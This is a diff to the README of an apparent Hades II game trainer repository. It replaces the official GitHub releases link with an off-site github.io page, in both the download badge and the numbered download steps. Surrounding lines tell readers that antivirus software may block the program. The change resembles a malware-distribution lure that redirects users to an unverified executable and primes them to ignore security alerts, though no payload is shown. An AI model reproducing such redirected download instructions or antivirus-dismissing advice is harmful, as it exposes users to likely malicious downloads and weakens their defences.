@@ -1,6 +1,6 @@
 # 🛠️ Hades-II-Trainer-X - Customize your Hades II game sessions
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Attilachinaman378/Hades-II-Trainer-X/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://attilachinaman378.github.io)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Check that your antivirus software does not block the application. Some security
 
 Follow these steps to obtain the program files:
 
-1. Visit the [official release page](https://github.com/Attilachinaman378/Hades-II-Trainer-X/releases).
+1. Visit the [official release page](https://attilachinaman378.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Click the zip file to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
